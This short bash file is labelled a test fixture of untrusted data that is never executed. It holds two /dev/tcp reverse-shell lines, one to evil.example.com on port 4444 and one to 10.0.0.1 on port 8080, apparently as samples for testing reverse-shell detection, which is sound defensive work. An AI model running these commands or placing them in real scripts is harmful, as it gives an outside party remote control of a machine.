#!/bin/bash
# FIXTURE (untrusted data — NEVER executed). Exercises: bash /dev/tcp reverse shell.
exec 5<>/dev/tcp/evil.example.com/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
